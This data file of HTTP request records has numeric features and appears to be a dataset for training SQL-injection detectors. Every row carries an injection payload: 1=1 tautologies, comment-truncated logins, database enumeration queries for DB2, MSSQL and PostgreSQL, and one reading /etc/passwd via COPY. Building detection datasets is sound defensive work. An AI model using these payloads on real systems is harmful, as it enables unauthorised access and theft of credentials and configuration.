31,1,200,7139,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,2815,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
26,1,200,1441,7,4,4,1,0,GET ?id= or 0=0 – HTTP/1.1
26,1,200,6759,7,4,4,1,0,GET ?id= or 0=0 – HTTP/1.1
26,1,200,7938,7,4,4,1,0,GET ?id= or 0=0 – HTTP/1.1
26,1,200,3056,7,4,4,1,0,GET ?id= or 0=0 – HTTP/1.1
44,1,200,2691,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,4667,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,1170,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
87,1,200,3729,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,6155,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,5176,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,2683,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,7161,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,6747,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,4471,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,1097,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,1810,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
43,1,200,3603,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,7457,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6676,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,4052,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6492,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6232,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
59,1,200,1341,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,1463,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4224,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,6058,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,3599,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4706,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,1126,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
43,1,200,7620,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,1328,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,4625,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,1110,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,7912,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,4622,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
47,1,200,1062,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
47,1,200,6387,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
33,1,200,5504,7,12,6,2,1,GET login/?id=' and a='a HTTP/1.1
33,1,200,4641,7,12,6,2,1,GET login/?id=' and a='a HTTP/1.1
32,1,200,4283,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
24,1,200,1459,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,6579,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,2792,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
55,1,200,6502,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3674,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5353,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2655,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1726,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,2204,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6972,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6991,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,5180,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3367,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
61,1,200,2536,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,2695,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,4438,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,2686,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,1733,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,7990,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,6495,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,7684,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
54,1,200,6521,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2835,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6904,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5586,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2483,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1345,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3900,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4086,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6022,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5614,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
51,1,200,5882,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,7892,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,3020,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,5027,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1246,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1322,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
36,1,200,1200,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,5206,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
61,1,200,4860,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,4846,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,6009,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,7603,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,1427,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,3613,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,6760,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,7680,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,1316,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
38,1,200,3380,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5755,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5638,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,2354,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
20,1,200,3277,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,4559,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,6961,7,2,5,1,1,GET ?id=' # HTTP/1.1
62,1,200,5755,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,7854,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,3967,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,2683,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,1897,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,3809,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,7006,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,4380,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,3394,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
57,1,200,2079,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,4804,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,7126,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5530,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,1372,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2947,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5897,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
40,1,200,6530,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2011,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2857,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2318,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2105,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4453,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4375,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
